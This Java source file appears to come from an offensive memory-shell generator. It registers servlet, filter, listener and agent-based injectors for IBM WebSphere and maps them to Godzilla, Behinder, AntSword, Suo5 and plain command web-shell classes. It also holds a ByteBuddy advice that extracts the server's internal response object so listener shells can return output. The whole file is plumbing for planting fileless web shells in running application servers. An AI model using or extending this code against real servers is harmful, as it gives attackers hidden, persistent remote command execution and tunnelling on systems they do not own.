package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import com.reajason.javaweb.memshell.websphere.injector.WebSphereFilterChainAgentInjector;
import com.reajason.javaweb.memshell.websphere.injector.WebSphereFilterInjector;
import com.reajason.javaweb.memshell.websphere.injector.WebSphereListenerInjector;
import com.reajason.javaweb.memshell.websphere.injector.WebSphereServletInjector;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class WebSphereShell extends AbstractShell {
    public static final String AGENT_FILTER_MANAGER = AGENT + "FilterManager";

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connContext"), "_response");
        }
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, WebSphereServletInjector.class)
                .addInjector(FILTER, WebSphereFilterInjector.class)
                .addInjector(LISTENER, WebSphereListenerInjector.class)
                .addInjector(AGENT_FILTER_MANAGER, WebSphereFilterChainAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(SERVLET, CommandServlet.class)
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Command))
                .addShellClass(AGENT_FILTER_MANAGER, CommandFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(SERVLET, GodzillaServlet.class)
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Godzilla))
                .addShellClass(AGENT_FILTER_MANAGER, GodzillaFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(SERVLET, BehinderServlet.class)
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Behinder))
                .addShellClass(AGENT_FILTER_MANAGER, BehinderFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(SERVLET, Suo5Servlet.class)
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Suo5))
                .build());

        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(SERVLET, AntSwordServlet.class)
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.AntSword))
                .addShellClass(AGENT_FILTER_MANAGER, AntSwordFilterChainAdvisor.class)
                .build());
    }
}
